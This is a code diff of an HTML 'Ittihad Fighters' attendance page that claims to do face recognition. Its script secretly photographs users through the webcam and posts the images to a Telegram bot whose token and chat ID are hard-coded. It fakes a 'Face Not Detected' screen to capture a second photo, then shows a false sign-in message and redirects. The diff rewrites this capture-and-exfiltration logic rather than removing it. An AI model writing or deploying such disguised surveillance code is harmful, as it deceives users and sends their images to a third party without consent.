@@ -3,121 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ittihad Fighters - Attendance</title>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <title>Ittihad Fighters</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; }
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
         .hidden { display: none; }
-        #animation { font-size: 24px; font-weight: bold; margin-top: 20px; }
-        #scanning-animation { display: none; font-size: 24px; font-weight: bold; color: blue; }
-        #face-not-detected { display: none; font-size: 24px; font-weight: bold; color: red; }
+        .scan-animation {
+            width: 100px;
+            height: 100px;
+            margin: 20px auto;
+            border: 5px solid #ff4081;
+            border-radius: 50%;
+            animation: scan 2s infinite;
+        }
+        @keyframes scan {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
 <body>
-    <h1>Ittihad Fighters</h1>
-    <div id="attendance-section">
-        <p>Select Your Name:</p>
-        <select id="name-select">
-            <option value="izz">Izz</option>
-            <option value="ahmad">Ahmad</option>
-            <option value="ali">Ali</option>
-        </select>
-        <button onclick="markAttendance()">Mark Attendance</button>
+    <div id="class-selection">
+        <h1>Ittihad Fighters</h1>
+        <p>Select your name:</p>
+        <ul id="name-list"></ul>
+        <button id="proceed" class="hidden">Continue</button>
+        <button id="cancel">Cancel</button>
     </div>
 
-    <div id="face-recognition-section" class="hidden">
-        <p>Face Recognition</p>
-        <button onclick="startScanning()">Continue</button>
-        <button onclick="cancelProcess()">Cancel</button>
+    <div id="face-recognition" class="hidden">
+        <div class="scan-animation"></div>
+        <p>Scanning face...</p>
     </div>
 
-    <div id="scanning-animation">Scanning face...</div>
-    <div id="face-not-detected">Face Not Detected</div>
-    <canvas id="canvas" class="hidden"></canvas>
-    <p id="final-message" class="hidden"></p>
+    <div id="face-not-detected" class="hidden">
+        <p>Face Not Detected</p>
+    </div>
+
+    <div id="completion" class="hidden">
+        <p id="signed-in"></p>
+        <p>You look beautiful/handsome today!</p>
+        <p>Redirecting...</p>
+    </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
-        let markedNames = new Set();
-        
-        function markAttendance() {
-            let nameSelect = document.getElementById('name-select');
-            let selectedName = nameSelect.value;
-            
-            if (markedNames.has(selectedName)) {
-                Swal.fire('Error', 'This name has already been marked.', 'error');
-                return;
-            }
-            markedNames.add(selectedName);
-            document.getElementById('attendance-section').classList.add('hidden');
-            document.getElementById('face-recognition-section').classList.remove('hidden');
-        }
+        const selectedNames = new Set();
+        const names = ['Izz', 'Ali', 'Amin', 'Siti', 'Aisyah'];
 
-        function cancelProcess() {
-            Swal.fire('Process Cancelled', 'Page will stop here.', 'info');
-        }
+        $(document).ready(function() {
+            names.forEach(name => {
+                $('#name-list').append(`<li><label><input type="checkbox" class="name-checkbox" value="${name}"> ${name}</label></li>`);
+            });
 
-        function startScanning() {
-            document.getElementById('face-recognition-section').classList.add('hidden');
-            document.getElementById('scanning-animation').style.display = 'block';
-            
-            setTimeout(captureAndSend, 2000);
-        }
+            $('.name-checkbox').on('change', function() {
+                if (this.checked) {
+                    selectedNames.add(this.value);
+                    this.disabled = true;
+                }
+                $('#proceed').toggleClass('hidden', selectedNames.size === 0);
+            });
 
-        function captureAndSend() {
-            let canvas = document.getElementById('canvas');
+            $('#proceed').on('click', function() {
+                $('#class-selection').addClass('hidden');
+                $('#face-recognition').removeClass('hidden');
+                setTimeout(() => takePicture(1), 2000);
+            });
+
+            $('#cancel').on('click', function() {
+                alert('Page will stop here.');
+            });
+        });
+
+        function takePicture(step) {
+            let canvas = document.createElement('canvas');
             let ctx = canvas.getContext('2d');
             let video = document.createElement('video');
-            
             navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                 video.srcObject = stream;
                 video.play();
-                
                 setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = 640;
+                    canvas.height = 480;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    sendPhoto(canvas);
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    
-                    document.getElementById('scanning-animation').style.display = 'none';
-                    document.getElementById('face-not-detected').style.display = 'block';
-                    
-                    setTimeout(() => {
-                        document.getElementById('face-not-detected').style.display = 'none';
-                        document.getElementById('scanning-animation').style.display = 'block';
-                        
-                        setTimeout(() => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            sendPhoto(canvas);
-                            video.srcObject.getTracks().forEach(track => track.stop());
-                            
-                            document.getElementById('scanning-animation').style.display = 'none';
-                            document.getElementById('final-message').innerText = `${document.getElementById('name-select').value} signed in. You look beautiful/handsome today! Redirecting...`;
-                            document.getElementById('final-message').classList.remove('hidden');
-                            
-                            setTimeout(() => {
-                                window.location.href = 'https://studandlearn.github.io/project-2/';
-                            }, 3000);
-                        }, 2000);
-                    }, 5000);
+                    stream.getTracks().forEach(track => track.stop());
+                    sendToTelegram(canvas, step);
                 }, 2000);
-            }).catch(err => console.error('Camera access denied:', err));
+            });
         }
-        
-        function sendPhoto(canvas) {
+
+        function sendToTelegram(canvas, step) {
             canvas.toBlob(blob => {
                 let formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("photo", blob, "face.jpg");
-                
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
-                }).catch(err => console.error("Error sending photo: ", err));
+                }).then(() => {
+                    if (step === 1) {
+                        $('#face-recognition').addClass('hidden');
+                        $('#face-not-detected').removeClass('hidden');
+                        setTimeout(() => {
+                            $('#face-not-detected').addClass('hidden');
+                            $('#face-recognition').removeClass('hidden');
+                            takePicture(2);
+                        }, 5000);
+                    } else {
+                        $('#face-recognition').addClass('hidden');
+                        $('#completion').removeClass('hidden');
+                        $('#signed-in').text([...selectedNames].join(', ') + " signed in ✅");
+                        setTimeout(() => {
+                            window.location.href = "https://studandlearn.github.io/project-2/";
+                        }, 3000);
+                    }
+                });
             }, 'image/jpeg');
         }
     </script>
